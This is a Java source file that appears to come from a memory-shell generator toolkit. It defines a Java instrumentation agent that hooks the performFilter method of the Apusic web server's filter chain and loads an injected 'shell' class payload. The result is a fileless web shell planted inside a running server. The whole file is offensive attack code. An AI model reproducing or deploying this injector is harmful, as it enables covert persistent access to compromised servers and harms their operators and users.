package org.leo.jmg.mem.injectortpl.apusic;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** performFilter Agent 挂载模板。 */
public class ApusicFilterChainAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "com/apusic/web/container/FilterChainImpl"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new ApusicFilterChainAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new ApusicFilterChainAgentInjector());
    }

    @Override
    protected String[] targetClasses() { return TARGET_CLASSES; }

    @Override
    protected String targetMethodName() { return "performFilter"; }

    @Override
    protected String shellClassName() { return shellClassName; }

    @Override
    protected String shellClassPayload() { return shellClass; }
}
